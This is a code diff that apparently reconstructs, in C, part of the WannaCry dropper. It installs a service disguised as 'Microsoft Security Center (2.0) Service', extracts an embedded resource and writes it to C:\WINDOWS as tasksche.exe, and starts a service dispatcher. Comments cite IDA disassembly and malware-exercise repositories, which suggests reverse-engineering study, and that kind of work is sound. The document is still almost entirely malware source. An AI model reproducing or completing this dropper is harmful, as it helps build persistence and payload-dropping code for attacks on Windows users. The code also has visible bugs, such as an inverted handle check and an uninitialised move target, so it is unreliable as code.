@@ -15,11 +15,13 @@
 #include <wininet.h>
 #pragma comment(lib, "wininet.lib")
 
+//globals
+char executable_path[MAX_PATH]; //Get executable path 
+
 int create_service()
 {
     SC_HANDLE hSCManager;
     SC_HANDLE hService;
-    char executable_path[MAX_PATH]; //Get executable path 
     char exec_with_args[260];
     
     sprintf(exec_with_args, "%s -m security", executable_path);
@@ -27,7 +29,7 @@ int create_service()
     if(hSCManager != NULL)
     {
         //Fix this
-        hService = CreateServiceA(hSCManager,"mssecsvc2.0", "Microsoft Security Center (2.0) Service", 0xf01ff, 16, 2, 1, exec_with_args, NULL, NULL, NULL, NULL, NULL );
+        hService = CreateServiceA(hSCManager, "mssecsvc2.0", "Microsoft Security Center (2.0) Service", 0xf01ff, 16, 2, 1, &exec_with_args, NULL, NULL, NULL, NULL, NULL);
         if(hService != NULL)
         {
             StartServiceA(hService, 0, NULL);
@@ -46,28 +48,40 @@ int drop_tasksche()
     HANDLE hFile;
 
     //fix these function definitions
+    /*
     GetProcAddress(hModule, "CreateProcessA");
     GetProcAddress(hModule, "CreateFileA");
     GetProcAddress(hModule, "WriteFile");
     GetProcAddress(hModule, "CloseHandle");
     
+    typedef BOOL (WINAPI *_CLOSEHANDLE)(HANDLE hObject);
+    typedef HANDLE (WINAPI *_CREATEFILEW)(LPCTSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
+
+    fCloseHandle = (_CLOSEHANDLE)GetProcAddress(hModule, CLOSEHANDLE, 0);
+    fCreateFile = (_CREATEFILEW)GetProcAddress(hModule, CREATEFILEW, 0);
+    
+    */
+    //copied from: https://github.com/gbmaster/loadLibrary/blob/master/kernel32.cpp
+    
     PROCESS_INFORMATION pi;
     STARTUPINFOA si;
-
+    DWORD nNumberOfBytesWritten;
+    
     HRSRC hResInfo = FindResourceA(0, 1831, "UNK");
     HGLOBAL hResData = LoadResource(0, hResInfo);
     PVOID lpBuffer = LockResource(hResData);
     DWORD nNumberOfBytesToWrite = SizeofResource(0, hResInfo);
     char szFileName[] = "tasksche.exe";
     char szPath[MAX_PATH];
-    sprintf(szPath, "C:\\%s\\%s", "WINDOWS", szFileName);
     char szNewPath[MAX_PATH];
+    sprintf(szPath, "C:\\%s\\%s", "WINDOWS", szFileName);
     sprintf(szPath, "C:\\%s\\qeriuwjhrf", "WINDOWS");
     MoveFileExA(szPath, szNewPath, 1);
+    //GENERIC_WRITE is 0x40000000
     hFile = CreateFileA(szPath, 0x40000000, 0, 0, 2, 4, 0);
     if(hFile != INVALID_HANDLE_VALUE)
     {
-        WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, &lpBuffer, 0);
+        WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, &nNumberOfBytesWritten, 0);
         CloseHandle(hFile);
     }
     
@@ -88,11 +102,12 @@ int no_argument_handler()
 //https://github.com/jnwilson/MalwareExercises/blob/0994222f90bd7de305ff8115dec053065f8d013f/Chapter%207/ex1.c
 //https://github.com/StefanoBelli/lol/blob/92fd0e349ac42eb71ae9a1302559567cca64c0a1/Win32/ServiceLauncher.c
 //https://github.com/sagishahar/scripts/blob/master/windows_service.c
+//IDA screenshots: https://www.programmersought.com/article/23574059266/
 int RealMain()
 {
   SC_HANDLE hSCManager;
   SC_HANDLE SCObject;
-  SERVICE_TABLE_ENTRYA Sstack;
+  SERVICE_TABLE_ENTRYA ServiceStartTable;
   int *argc;
   char szName[] = "MSSecSvc";
   GetModuleFileName(NULL, &executable_path, sizeof(executable_path));
@@ -104,26 +119,27 @@ int RealMain()
   }
   
   /* https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights */
-  hSCManager = OpenSCManager(0,0,SC_MANAGER_ALL_ACCESS);
+  hSCManager = OpenSCManager(0, 0, SC_MANAGER_ALL_ACCESS);
   
   if(!hSCManager)
   {
     hSCObject = OpenServiceA(hSCManager, szName, SERVICE_START);
     if(!hSCObject)
     {
-      //SomeFunction(hSCObject, 0x3c);
+      //sub_407FA0 hSCObject, 0x3c);
       CloseServiceHandle(hSCObject);
     }
     CloseServicehandle(hSCManager);
   }
   
-  Sstack.lpServiceName = "MSSecSvc 2.0";
-  Sstack.lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
+  ServiceStartTable.lpServiceName = "MSSecSvc 2.0";
+  ServiceStartTable.lpServiceProc = (LPSERVICE_MAIN_FUNCTION) ServiceMain;
+                                  /* find out what sub_408000 ( ServiceMain ) is */
 
-  StartServiceCtrlDispatcher(&Sstack);
+  return StartServiceCtrlDispatcher(&ServiceStartTable);
 
-  CloseServiceHandle(hSCManager);
-  CloseServiceHandle(SCObject);
+  //CloseServiceHandle(hSCManager);
+  //CloseServiceHandle(SCObject);
 }
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
